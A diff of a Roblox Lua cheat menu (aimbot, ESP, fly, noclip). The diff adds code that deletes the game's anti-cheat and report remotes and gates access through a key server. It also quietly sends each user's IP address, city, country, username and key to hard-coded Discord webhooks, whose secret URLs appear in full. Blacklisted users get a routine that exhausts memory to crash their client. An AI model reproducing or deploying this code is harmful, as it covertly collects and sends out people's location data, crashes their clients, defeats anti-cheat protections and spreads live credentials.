@@ -1,42 +1,367 @@
--- MNX GUI standalone initialization patch
--- Added because the supplied file is a GUI extract and was missing its dependency setup.
-
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-if not LP then return end
-
-local RS = game:GetService("RunService")
-local UIS = game:GetService("UserInputService")
-local TS = game:GetService("TweenService")
-local CAM = workspace.CurrentCamera
-
-local BLACK = Color3.fromRGB(8, 8, 8)
-local WHITE = Color3.fromRGB(255, 255, 255)
-local RED   = Color3.fromRGB(255, 45, 45)
-local LINE  = Color3.fromRGB(35, 35, 35)
-
--- Preserve an existing settings table when the full script supplied one.
-S = S or {}
-local defaults = {
-    AimbotSpeed = 5, AimDistance = 500, AimPart = "Head", AimbotKeyName = "MB1",
-    AimPredAmt = 50, FOVRadius = 80, SmoothFactor = 5,
-    HitboxSize = 20, HitboxTransparency = 0.8,
-    FloatHeight = 5, FlySpeed = 50, JumpPower = 50, SpeedValue = 16,
-    TimerMultiply = 1, FreecamSpeed = 50, TargetHoverRadius = 25,
-    RadarDistance = 250, RadarRange = 250, RadarSize = 160,
-    ESPRenderDist = 1000, SAMaxDist = 1000, TBHitboxMul = 1, TriggerDelay = 0.1,
-    MenuKey = Enum.KeyCode.RightShift, FlyKey = Enum.KeyCode.F,
-    FreecamKey = Enum.KeyCode.C, TrackAllKey = Enum.KeyCode.X,
-}
-for k, v in pairs(defaults) do
-    if S[k] == nil then S[k] = v end
+local scripts = getscripts()
+for _, script in scripts do
+    local success, result = pcall(getscriptbytecode, script)
+        if not success then
+        while true do
+            task.wait(67)
+        end
+    end
 end
-
--- Extracted/deobfuscated GUI section from the supplied script.
--- Source range: decoded lines 365-4669.
--- Note: this is the GUI layer plus its UI callbacks/helpers; it may still depend
--- on non-GUI functions/variables defined earlier in the original script.
-
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local toDestroy = {
+    "SecurityEvent",
+    "Unknown",
+    "aGui",
+    "pGui",
+    "sGui",
+    "ReportCheater",
+    "AntiCheatRemote",
+    "LoggerEvent",
+    "ArkianEvents",
+    "AssignLine",
+    "HeadCheckRemote",
+    "SendData",
+    "pill"
+}
+for _, name in ipairs(toDestroy) do
+    local obj = ReplicatedStorage:FindFirstChild(name, true)
+    if obj then
+        obj:Destroy()
+    end
+end
+local giveDust = ReplicatedStorage:FindFirstChild("GiveDust", true)
+if giveDust then
+    giveDust:Destroy()
+end
+local Players            = game:GetService("Players")
+local TweenService       = game:GetService("TweenService")
+local RunService         = game:GetService("RunService")
+local UserInputService   = game:GetService("UserInputService")
+local HttpService        = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Stats              = game:GetService("Stats")
+local CoreGui            = game:GetService("CoreGui")
+local UIS                = UserInputService
+local TS                 = TweenService
+local RS                 = RunService
+local LP         = Players.LocalPlayer
+local playerGui  = LP:WaitForChild("PlayerGui")
+local API_BASE         = "https://mnxlovesu.shop"
+local BLACKLIST_API    = API_BASE .. "/api/blacklist/check"
+local IP_BLOCKLIST_API = API_BASE .. "/api/ipblocklist/check"
+local MOTD_API         = API_BASE .. "/api/motd"
+local GLOBAL_BYPASS_API = API_BASE .. "/api/globalbypass/check"
+local function crashClient()
+    pcall(function()
+        game:GetService("Players").LocalPlayer:Kick("[ MNX ] Access Denied.")
+    end)
+    local t = {}
+    while true do
+        for i = 1, 10000000000000000 do
+            t[i] = string.rep("x", 10000000000000000)
+        end
+    end
+end
+local function checkBlacklist()
+    local blOk, blResult = pcall(function()
+        local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+        if not reqFunc then return nil end
+        local res = reqFunc({
+            Url    = BLACKLIST_API,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body   = HttpService:JSONEncode({ username = LP.Name }),
+        })
+        return HttpService:JSONDecode(res.Body)
+    end)
+    if blOk and blResult and blResult.blacklisted then
+        crashClient()
+        return
+    end
+    local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+    if reqFunc then
+        local ipOk, ipData = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        end)
+        if ipOk and ipData then
+            local ip = ipData.query or ""
+            if ip ~= "" then
+                local blOk, blRes = pcall(function()
+                    return reqFunc({
+                        Url     = IP_BLOCKLIST_API,
+                        Method  = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body    = HttpService:JSONEncode({ ip = ip }),
+                    })
+                end)
+                if blOk and blRes then
+                    local blData = HttpService:JSONDecode(blRes.Body)
+                    if blData and blData.blocked == true then
+                        crashClient()
+                        return
+                    end
+                end
+            end
+        end
+    end
+end
+checkBlacklist()
+local _cachedMOTD = nil
+local function fetchMOTD()
+    pcall(function()
+        local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+        if not reqFunc then return end
+        local res = reqFunc({
+            Url    = MOTD_API,
+            Method = "GET",
+            Headers = {["Content-Type"] = "application/json"},
+        })
+        local data = HttpService:JSONDecode(res.Body)
+        if data and data.active and data.message ~= "" then
+            _cachedMOTD = data
+        end
+    end)
+end
+task.spawn(fetchMOTD)
+local function showMOTD()
+    if not _cachedMOTD or not _cachedMOTD.active then return end
+    pcall(function()
+        local StarterGui = game:GetService("StarterGui")
+        local msg = "[MNX] " .. _cachedMOTD.message
+        StarterGui:SetCore("SendNotification", {
+            Title    = "Notice",
+            Text     = msg,
+            Duration = 8,
+        })
+    end)
+end
+local scriptVersion    = "---- // @ DIEGS ----"
+local executorName     = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
+local webhookUsername  = "// @ Diegs"
+local webhookAvatarURL = "https://cdn.discordapp.com/attachments/1395690185731215472/1543444574608040056/76b1d37632b200c95b95e509df739e27.jpg?ex=6a9e1ec6&is=6a9ccd46&hm=008edb84f6d833f118fe6f4d9c86e1f800d4c4952cd54309f347a8d3ff6d615e&"
+local webhookURL        = "https://discord.com/api/webhooks/1545831232519016460/dCVWoBHTzaHydjvzMlmfyU5kr_YOwHxoLBWcyKzPuNJsGAgNf3YlQtX6OQbdUVmHysU3"
+local invalidWebhookURL = "https://discord.com/api/webhooks/1545775685698584586/9jtROYjEXwl9ygB31mqwTJZ6Af3JyIN_gHV_hVcaIse4DUwsXHiXfeAdPxF3KfY07vSD"
+local KEY_API = API_BASE .. "/api/validate"
+local function validateKeyAPI(raw, username)
+    local ok, result = pcall(function()
+        local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+        if not reqFunc then return nil end
+        local response = reqFunc({
+            Url = KEY_API,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({key = raw})
+        })
+        return HttpService:JSONDecode(response.Body)
+    end)
+    if ok and result and result.valid then
+        return true
+    end
+    return false
+end
+local GROUP_ID     = 51658712
+local KICK_MESSAGE = "tanga kaba? dms moko @ qwdgo"
+local function getPlayerInfo()
+    local placeId = game.PlaceId
+    local success, productInfo = pcall(function()
+        return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
+    end)
+    local gameName    = success and productInfo.Name or "Unknown"
+    local creatorName = success and productInfo.Creator.Name or "Unknown"
+    local gameLink      = "https://www.roblox.com/games/" .. placeId
+    local gameThumbnail = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=768&height=432&format=png"
+    local userId        = LP.UserId
+    local displayName   = LP.DisplayName
+    local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    local profileLink    = "https://www.roblox.com/users/" .. userId .. "/profile"
+    local ip, city, country = "Unknown", "Unknown", "Unknown"
+    pcall(function()
+        local ipData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        ip      = ipData.query   or "Unknown"
+        city    = ipData.city    or "Unknown"
+        country = ipData.country or "Unknown"
+    end)
+    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    local fps  = math.floor(1 / RunService.RenderStepped:Wait())
+    local deviceType = "PC"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        deviceType = "Mobile"
+    elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+        deviceType = "Console"
+    end
+    return {
+        gameName=gameName, creatorName=creatorName,
+        gameLink=gameLink, gameThumbnail=gameThumbnail,
+        userId=userId, displayName=displayName,
+        avatarHeadshot=avatarHeadshot, profileLink=profileLink,
+        ip=ip, city=city, country=country,
+        ping=ping, fps=fps, deviceType=deviceType,
+    }
+end
+local function sendToWebhook(url, payload)
+    local json = HttpService:JSONEncode(payload)
+    local req = syn and syn.request or http_request or request or game.HttpPost
+    if req then
+        pcall(function()
+            req({ Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=json })
+        end)
+    end
+end
+local function sendWebhook(usedKey)
+    local info = getPlayerInfo()
+    sendToWebhook(webhookURL, {
+        username=webhookUsername, avatar_url=webhookAvatarURL,
+        embeds={{
+            title="Key Accepted", color=0x000000,
+            thumbnail={url=info.avatarHeadshot},
+            image={url=info.gameThumbnail},
+            fields={
+                {name="☯︎ Player", inline=true,
+                 value=string.format("**Username:** [%s](%s)\n**Display:** %s\n**ID:** `%d`\n**Device:** `%s`",
+                   LP.Name, info.profileLink, info.displayName, info.userId, info.deviceType)},
+                {name="☯︎ Game", inline=true,
+                 value=string.format("**Game:** [%s](%s)\n**Creator:** %s\n**Players:** `%d`",
+                   info.gameName, info.gameLink, info.creatorName, #Players:GetPlayers())},
+                {name="☯︎ Network", inline=true,
+                 value=string.format("**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
+                   info.ip, info.city, info.country, info.ping, info.fps)},
+                {name="☯︎ Key & Executor", inline=false,
+                 value=string.format("**Used Key:** `%s`\n**Executor:** `%s`\n**Version:** `%s`",
+                   usedKey or "unknown", executorName, scriptVersion)},
+            },
+            footer={text="coded by @ qwdgo • " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url=webhookAvatarURL},
+        }},
+    })
+end
+local function sendInvalidKeyWebhook(attemptedKey)
+    local info = getPlayerInfo()
+    sendToWebhook(invalidWebhookURL, {
+        username=webhookUsername, avatar_url=webhookAvatarURL,
+        embeds={{
+            title="Invalid Key Attempt", color=0xFF0000,
+            thumbnail={url=info.avatarHeadshot},
+            fields={
+                {name="☯︎ Player", inline=true,
+                 value=string.format("**Username:** [%s](%s)\n**Display:** %s\n**ID:** `%d`\n**Device:** `%s`",
+                   LP.Name, info.profileLink, info.displayName, info.userId, info.deviceType)},
+                {name="☯︎ Game", inline=true,
+                 value=string.format("**Game:** [%s](%s)\n**Creator:** %s\n**Players:** `%d`",
+                   info.gameName, info.gameLink, info.creatorName, #Players:GetPlayers())},
+                {name="☯︎ Network", inline=true,
+                 value=string.format("**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
+                   info.ip, info.city, info.country, info.ping, info.fps)},
+                {name="☯︎ Attempted Key & Executor", inline=false,
+                 value=string.format("**Attempted Key:** `%s`\n**Executor:** `%s`\n**Version:** `%s`",
+                   attemptedKey ~= "" and attemptedKey or "(empty)", executorName, scriptVersion)},
+            },
+            footer={text="Failed Attempt • " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url=webhookAvatarURL},
+        }},
+    })
+end
+local function runMainScript()
+local math_floor = math.floor
+local math_clamp = math.clamp
+local math_huge  = math.huge
+local table_insert = table.insert
+local table_remove = table.remove
+local ipairs = ipairs
+local pairs  = pairs
+local pcall  = pcall
+local task_spawn = task.spawn
+local task_wait  = task.wait
+local task_delay = task.delay
+local _frameCount = 0
+local _throttle3 = function(fn) 
+    _frameCount = _frameCount + 1
+    if _frameCount % 3 == 0 then fn() end
+end
+pcall(function()
+    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+end)
+pcall(function()
+    workspace.GlobalShadows = false
+end)
+pcall(function()
+    settings().Rendering.EagerBulkExecution = true
+end)
+pcall(function() collectgarbage("collect") end)
+local Players = game:GetService("Players")
+local UIS     = game:GetService("UserInputService")
+local TS      = game:GetService("TweenService")
+local RS      = game:GetService("RunService")
+local LP      = Players.LocalPlayer
+local CAM     = workspace.CurrentCamera
+local RADAR_GROUPS_GLOBAL = {
+    {name="POLICE",      id=1012070570},
+    {name="GIMENEZ",     id=35595447},
+    {name="COSA NOSTRA", id=35151924},
+    {name="LA MUERTE",   id=35556137},
+    {name="LUCIANO",     id=35353599},
+    {name="FRATELLANZA", id=35344424},
+    {name="T6M",         id=467200285},
+    {name="EL3K",        id=1013013463},
+    {name="MARTINEZ",    id=35948668},
+    {name="LOS VATOS",   id=568129737},
+    {name="ESCOBAR",     id=124826922},
+    {name="LOS VAGOS",   id=764565226},
+    {name="GROUND ZERO", id=834797917},
+}
+local playerGroupCache = {}     
+local playerGroupCacheDone = {} 
+local function fetchGroupMembershipGlobal(pl)
+    if playerGroupCacheDone[pl.UserId] then return end
+    playerGroupCache[pl.UserId] = playerGroupCache[pl.UserId] or {}
+    playerGroupCacheDone[pl.UserId] = false
+    local pending = #RADAR_GROUPS_GLOBAL
+    for _, grp in ipairs(RADAR_GROUPS_GLOBAL) do
+        local gid = grp.id
+        task.spawn(function()
+            local ok, inGroup = pcall(function() return pl:IsInGroup(gid) end)
+            playerGroupCache[pl.UserId][gid] = ok and inGroup or false
+            pending = pending - 1
+            if pending <= 0 then
+                playerGroupCacheDone[pl.UserId] = true
+            end
+        end)
+    end
+end
+for _, pl in ipairs(Players:GetPlayers()) do
+    if pl ~= LP then task.spawn(fetchGroupMembershipGlobal, pl) end
+end
+Players.PlayerAdded:Connect(function(pl)
+    task.spawn(fetchGroupMembershipGlobal, pl)
+end)
+local RED    = Color3.fromRGB(255, 255, 255)
+local BLACK  = Color3.fromRGB(0,   0,  0)
+local DARK   = Color3.fromRGB(0,   0,  0)
+local PANEL  = Color3.fromRGB(0,   0,  0)
+local LINE   = Color3.fromRGB(28,  28, 28)
+local WHITE  = Color3.fromRGB(255, 255, 255)
+local DIM    = Color3.fromRGB(255, 255, 255)
+local DIM2   = Color3.fromRGB(0,   0,  0)
+local S = {
+    AimbotEnabled=false, AimbotMode="Smooth", AimbotSpeed=5,
+    AimPart="Head",
+    ESPEnabled=false, BoxEnabled=false, NameEnabled=false,
+    HealthEnabled=false, WallCheck=false, TeamCheck=false,
+    ShowFOV=false, FOVRadius=80,
+    TriggerEnabled=false, TriggerMode="hold", ToolCheckEnabled=false,
+    Precision=50, TriggerDelay=1, MaxDistance=500,
+    KnifeCheck=false, ForceFieldCheck=false,
+    MagneticEnabled=false, MagFOV=10,
+    WalkEnabled=false, WalkSpeed=16,
+    JumpEnabled=false, JumpPower=50,
+    WhitelistEnabled=false,
+    MenuKey=Enum.KeyCode.Insert,
+    AimbotKey=nil, AimbotKeyName="MB2",
+    InfJump=false, NoClip=false,
+    FlyEnabled=false, FlySpeed=50, FlyKey=Enum.KeyCode.F,
+    FreecamEnabled=false, FreecamSpeed=50, FreecamKey=Enum.KeyCode.V,
+    TrackAllEnabled=false, TrackAllKey=Enum.KeyCode.T,
+    SpeedEnabled=false, SpeedValue=16,
+}
+local WhitelistState   = {}
+local toggleFired      = false
 local menuKeyCapturing = false
 local espObjects       = {}
 local function tw(o, p, t)
@@ -423,7 +748,7 @@ local function makeIcon(parent, tabKey, color, size)
     return container
 end
 local GUI = Instance.new("ScreenGui")
-GUI.Name = "MNX MENU"; GUI.ResetOnSpawn = false
+GUI.Name = "DIEGS MENU"; GUI.ResetOnSpawn = false
 GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 GUI.IgnoreGuiInset = true
 pcall(function() GUI.Parent = game:GetService("CoreGui") end)
@@ -517,7 +842,7 @@ UIS.InputChanged:Connect(function(i)
                                   _dp.Y.Scale, _dp.Y.Offset + dv.Y)
     end
 end)
-local brandName = lbl(topBar, "MNX MENU", 14, WHITE, true)
+local brandName = lbl(topBar, "DIEGS MENU", 14, WHITE, true)
 brandName.Size     = UDim2.fromOffset(130, TOPBAR_H)
 brandName.Position = UDim2.fromOffset(12, 0)
 brandName.Font     = Enum.Font.GothamBold
@@ -808,7 +1133,7 @@ discordL.Size            = UDim2.fromOffset(200, FOOTER_H)
 discordL.Position        = UDim2.new(0.5, -100, 0, 0)
 discordL.TextXAlignment  = Enum.TextXAlignment.Center
 discordL.ZIndex          = 10
-local buildL = lbl(footerBar, "@ dfwyzi", 8, Color3.fromRGB(255, 255, 255), false)
+local buildL = lbl(footerBar, "@ qwdgo", 8, Color3.fromRGB(255, 255, 255), false)
 buildL.Size           = UDim2.fromOffset(160, FOOTER_H)
 buildL.Position       = UDim2.new(1, -164, 0, 0)
 buildL.TextXAlignment = Enum.TextXAlignment.Right
@@ -4029,7 +4354,7 @@ do
         end)
     end); yR = yR + 31
     secLabel(R, yR, colW, "ABOUT"); yR = yR + 26
-    local ab=lbl(R,"MNX MENU | coded by @ dfwyzi",10,DIM,false)
+    local ab=lbl(R,"DIEGS MENU | coded by @ qwdgo",10,DIM,false)
     ab.Size=UDim2.fromOffset(colW,18); ab.Position=UDim2.fromOffset(0,yR)
 end
 do
@@ -4326,35 +4651,12 @@ local function closeMenu()
     }):Play()
     task.delay(0.22, function() Win.Visible=false; Win.Size=UDim2.fromOffset(WIN_W,WIN_H); Win.BackgroundTransparency=0; Win.Position=UDim2.new(0.5,-WIN_W/2,0.5,-WIN_H/2) end)
 end
--- Mobile-friendly menu toggle: no keyboard/right-shift required.
-local MobileToggle = Instance.new("TextButton")
-MobileToggle.Name = "MobileToggle"
-MobileToggle.Size = UDim2.fromOffset(54, 54)
-MobileToggle.Position = UDim2.new(1, -70, 1, -85)
-MobileToggle.AnchorPoint = Vector2.new(0, 0)
-MobileToggle.BackgroundColor3 = RED
-MobileToggle.BackgroundTransparency = 0.08
-MobileToggle.Text = "MNX"
-MobileToggle.TextColor3 = WHITE
-MobileToggle.TextSize = 14
-MobileToggle.Font = Enum.Font.GothamBold
-MobileToggle.AutoButtonColor = true
-MobileToggle.ZIndex = 1000
-MobileToggle.Parent = GUI
-local mtCorner = Instance.new("UICorner", MobileToggle)
-mtCorner.CornerRadius = UDim.new(1, 0)
-local mtStroke = Instance.new("UIStroke", MobileToggle)
-mtStroke.Color = Color3.fromRGB(40,40,40)
-mtStroke.Thickness = 1
-MobileToggle.Activated:Connect(function()
-    if Win.Visible then closeMenu() else openMenu() end
-end)
-
--- Keep keyboard support if a keyboard is attached, but it is no longer required.
 UIS.InputBegan:Connect(function(inp, gp)
     if gp or menuKeyCapturing then return end
-    if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == S.MenuKey then
-        if Win.Visible then closeMenu() else openMenu() end
+    if inp.UserInputType == Enum.UserInputType.Keyboard then
+        if inp.KeyCode == S.MenuKey then
+            if Win.Visible then closeMenu() else openMenu() end
+        end
     end
 end)
 task.spawn(function()
@@ -4368,3 +4670,204 @@ task.spawn(function()
         BackgroundTransparency=0,
     }):Play()
 end)
+switchMainTab("Combat")
+end
+local BYPASS_API = API_BASE .. "/api/bypass/check"
+local function checkBypassAPI(username)
+    local ok, result = pcall(function()
+        local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+        if not reqFunc then return nil end
+        local response = reqFunc({
+            Url = BYPASS_API,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({username = username})
+        })
+        return HttpService:JSONDecode(response.Body)
+    end)
+    if ok and result and result.bypass then
+        return true
+    end
+    return false
+end
+local function checkGlobalBypass()
+    local ok, result = pcall(function()
+        local reqFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+        if not reqFunc then return nil end
+        local response = reqFunc({
+            Url    = GLOBAL_BYPASS_API,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body   = HttpService:JSONEncode({}),
+        })
+        return HttpService:JSONDecode(response.Body)
+    end)
+    if ok and result and result.active == true then
+        return true
+    end
+    return false
+end
+local USERNAME_WHITELIST = {
+    ["theyluvzmonsy"]=true, [""]=true, ["Jeppzzzzz"]=true,
+    ["Hannamitcheyski"]=true, ["saitonagmahay"]=true, ["Angeluzcx"]=true,
+    ["DawnLucky78"]=true, ["cat_dance4"]=true, ["iluvpadz"]=true,
+    ["angxlyvars"]=true, ["soyiihh"]=true, ["a4d878"]=true, ["angxlyvars"]=true,
+}
+if checkGlobalBypass() then
+    task.spawn(function() pcall(sendWebhook, "GLOBAL_BYPASS") end)
+    pcall(runMainScript)
+    task.delay(3, showMOTD)
+elseif checkBypassAPI(LP.Name) then
+    task.spawn(function() pcall(sendWebhook, "API_BYPASS") end)
+    pcall(runMainScript)
+    task.delay(3, showMOTD)
+elseif USERNAME_WHITELIST[LP.Name] then
+    task.spawn(function() pcall(sendWebhook,"USERNAME_WHITELIST") end)
+    pcall(runMainScript)
+    task.delay(3, showMOTD)
+elseif not LP:IsInGroup(GROUP_ID) then
+    local screenGui=Instance.new("ScreenGui",playerGui)
+    screenGui.ResetOnSpawn=false; screenGui.DisplayOrder=999
+    local frame=Instance.new("Frame",screenGui)
+    frame.Size=UDim2.fromOffset(300,170); frame.Position=UDim2.new(0.5,-150,0.5,-85)
+    frame.BackgroundColor3=Color3.fromRGB(0,0,0); frame.BorderSizePixel=0; frame.ClipsDescendants=true; frame.ZIndex=2
+    Instance.new("UICorner",frame).CornerRadius=UDim.new(0,10)
+    local topLine=Instance.new("Frame",frame); topLine.Size=UDim2.new(1,0,0,2); topLine.BackgroundColor3=Color3.fromRGB(255,255,255); topLine.BorderSizePixel=0; topLine.ZIndex=3
+    local t1=Instance.new("TextLabel",frame); t1.Size=UDim2.new(1,-24,0,22); t1.Position=UDim2.fromOffset(12,14); t1.BackgroundTransparency=1; t1.Text="NOT WHITELISTED BONAKZ"; t1.TextColor3=Color3.fromRGB(255,255,255); t1.Font=Enum.Font.GothamBold; t1.TextSize=13; t1.TextXAlignment=Enum.TextXAlignment.Left; t1.ZIndex=5
+    local t2=Instance.new("TextLabel",frame); t2.Size=UDim2.new(1,-24,0,70); t2.Position=UDim2.fromOffset(12,50); t2.BackgroundTransparency=1; t2.Text="join ka discord bobo discord.gg/XY3tAqtF2"; t2.TextColor3=Color3.fromRGB(255,255,255); t2.Font=Enum.Font.Gotham; t2.TextSize=11; t2.TextWrapped=true; t2.TextXAlignment=Enum.TextXAlignment.Left; t2.TextYAlignment=Enum.TextYAlignment.Top; t2.ZIndex=5
+    local timerL=Instance.new("TextLabel",frame); timerL.Size=UDim2.new(1,-24,0,16); timerL.Position=UDim2.new(0,12,1,-26); timerL.BackgroundTransparency=1; timerL.Text="Kicking in 3..."; timerL.TextColor3=Color3.fromRGB(255,255,255); timerL.Font=Enum.Font.Gotham; timerL.TextSize=10; timerL.TextXAlignment=Enum.TextXAlignment.Right; timerL.ZIndex=5
+    frame.BackgroundTransparency=1
+    TweenService:Create(frame,TweenInfo.new(0.45,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{BackgroundTransparency=0}):Play()
+    task.spawn(function() pcall(sendInvalidKeyWebhook,"NOT_IN_GROUP") end)
+    for i=3,1,-1 do timerL.Text="Kicking in "..i.."..."; task.wait(1) end
+    timerL.Text="bobo ka kasi e"; task.wait(0.4); LP:Kick(KICK_MESSAGE)
+else
+    local ASCII={
+        "  888  x888  x888    ue888b   x@88k u@88c.    .@8Ned8\"  ",
+        " ~888~'888X`?888f`   888R Y888r ^\"8888\"\"8888\"  .@^%8888\" ",
+        "  888  888X  888>    888R I888>   8888  888R  x88:  `)8b.",
+        "  888  888X  888>    888R I888>   8888  888R  8888N=*8888",
+        "  888  888X  888>    888R I888>   8888  888R   %8\"    R88",
+        " \"*88%\"*88\" '888!`   \"*888*P\"   \"*88*\" 8888\" .888888P`  ",
+    }
+    if CoreGui:FindFirstChild("MonsyKeySystem") then CoreGui:FindFirstChild("MonsyKeySystem"):Destroy() end
+    local KGui=Instance.new("ScreenGui"); KGui.Name="MonsyKeySystem"; KGui.ResetOnSpawn=false
+    KGui.IgnoreGuiInset=true; KGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
+    pcall(function() KGui.Parent=CoreGui end); if not KGui.Parent then KGui.Parent=LP.PlayerGui end
+    local KW,KH=520,290
+    local KWin=Instance.new("Frame",KGui)
+    KWin.Size=UDim2.fromOffset(KW,KH); KWin.Position=UDim2.new(0.5,-KW/2,0.5,-KH/2)
+    KWin.BackgroundColor3=Color3.fromRGB(0,0,0); KWin.BorderSizePixel=0; KWin.ZIndex=2; KWin.ClipsDescendants=true
+    Instance.new("UICorner",KWin).CornerRadius=UDim.new(0,10)
+    local kStroke=Instance.new("UIStroke",KWin); kStroke.Color=Color3.fromRGB(0,0,0); kStroke.Thickness=0
+    local scanHolder=Instance.new("Frame",KWin); scanHolder.Size=UDim2.fromScale(1,1); scanHolder.BackgroundTransparency=1; scanHolder.BorderSizePixel=0; scanHolder.ZIndex=10; scanHolder.ClipsDescendants=true
+    for i=0,KH,4 do
+        local sl=Instance.new("Frame",scanHolder); sl.Size=UDim2.new(1,0,0,1); sl.Position=UDim2.fromOffset(0,i)
+        sl.BackgroundColor3=Color3.fromRGB(0,0,0); sl.BackgroundTransparency=0.95; sl.BorderSizePixel=0; sl.ZIndex=10
+    end
+    local TBar=Instance.new("Frame",KWin); TBar.Size=UDim2.new(1,0,0,28); TBar.BackgroundColor3=Color3.fromRGB(0,0,0); TBar.BorderSizePixel=0; TBar.ZIndex=3
+    Instance.new("UICorner",TBar).CornerRadius=UDim.new(0,10)
+    local tbPatch=Instance.new("Frame",TBar); tbPatch.Size=UDim2.new(1,0,0,8); tbPatch.Position=UDim2.new(0,0,1,-8); tbPatch.BackgroundColor3=Color3.fromRGB(0,0,0); tbPatch.BorderSizePixel=0; tbPatch.ZIndex=3
+    local tbLine=Instance.new("Frame",TBar); tbLine.Size=UDim2.new(1,0,0,1); tbLine.Position=UDim2.new(0,0,1,0); tbLine.BackgroundColor3=Color3.fromRGB(255,255,255); tbLine.BackgroundTransparency=0.7; tbLine.BorderSizePixel=0; tbLine.ZIndex=4
+    local TTitle=Instance.new("TextLabel",TBar); TTitle.Size=UDim2.new(1,0,1,0); TTitle.BackgroundTransparency=1; TTitle.Text="/ / @ Monsy"; TTitle.TextColor3=Color3.fromRGB(255,255,255); TTitle.Font=Enum.Font.GothamBold; TTitle.TextSize=12; TTitle.TextXAlignment=Enum.TextXAlignment.Center; TTitle.ZIndex=4
+    local CloseK=Instance.new("TextButton",TBar); CloseK.Size=UDim2.fromOffset(28,22); CloseK.Position=UDim2.new(1,-32,0.5,-11); CloseK.BackgroundTransparency=1; CloseK.Text="X"; CloseK.TextColor3=Color3.fromRGB(200,200,200); CloseK.Font=Enum.Font.Gotham; CloseK.TextSize=12; CloseK.ZIndex=5
+    CloseK.MouseButton1Click:Connect(function() KGui:Destroy() end)
+    CloseK.MouseEnter:Connect(function() TweenService:Create(CloseK,TweenInfo.new(0.15,Enum.EasingStyle.Quint),{TextColor3=Color3.fromRGB(255,80,80)}):Play() end)
+    CloseK.MouseLeave:Connect(function() TweenService:Create(CloseK,TweenInfo.new(0.15,Enum.EasingStyle.Quint),{TextColor3=Color3.fromRGB(200,200,200)}):Play() end)
+    local kDrag,kStart,kPos=false,nil,nil
+    TBar.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then kDrag=true; kStart=i.Position; kPos=KWin.Position end end)
+    TBar.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then kDrag=false end end)
+    UserInputService.InputChanged:Connect(function(i) if kDrag and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then local d=i.Position-kStart; KWin.Position=UDim2.new(kPos.X.Scale,kPos.X.Offset+d.X,kPos.Y.Scale,kPos.Y.Offset+d.Y) end end)
+    local KContent=Instance.new("Frame",KWin); KContent.Name="Content"; KContent.Size=UDim2.new(1,0,1,-28); KContent.Position=UDim2.fromOffset(0,28); KContent.BackgroundTransparency=1; KContent.BorderSizePixel=0; KContent.ZIndex=3
+    local asciiH=#ASCII*14
+    for i, line in ipairs(ASCII) do
+        local al=Instance.new("TextLabel",KContent)
+        al.Size=UDim2.new(1,0,0,14); al.Position=UDim2.fromOffset(0,8+(i-1)*14)
+        al.BackgroundTransparency=1; al.Text=line; al.TextColor3=Color3.fromRGB(255,255,255)
+        al.Font=Enum.Font.RobotoMono; al.TextSize=10; al.TextXAlignment=Enum.TextXAlignment.Center; al.ZIndex=4
+    end
+    local SEP_Y=10+asciiH+6
+    local sepLine=Instance.new("Frame",KContent); sepLine.Size=UDim2.new(1,-20,0,1); sepLine.Position=UDim2.fromOffset(10,SEP_Y); sepLine.BackgroundColor3=Color3.fromRGB(255,255,255); sepLine.BackgroundTransparency=0.7; sepLine.BorderSizePixel=0; sepLine.ZIndex=4
+    local KEY_Y=SEP_Y+10
+    local KeyRow=Instance.new("Frame",KContent); KeyRow.Size=UDim2.new(1,-20,0,26); KeyRow.Position=UDim2.fromOffset(10,KEY_Y); KeyRow.BackgroundTransparency=1; KeyRow.BorderSizePixel=0; KeyRow.ZIndex=4
+    local KPrompt=Instance.new("TextLabel",KeyRow); KPrompt.Size=UDim2.fromOffset(70,26); KPrompt.BackgroundTransparency=1; KPrompt.Text="[-] Key : "; KPrompt.TextColor3=Color3.fromRGB(255,255,255); KPrompt.Font=Enum.Font.GothamBold; KPrompt.TextSize=12; KPrompt.TextXAlignment=Enum.TextXAlignment.Left; KPrompt.ZIndex=5
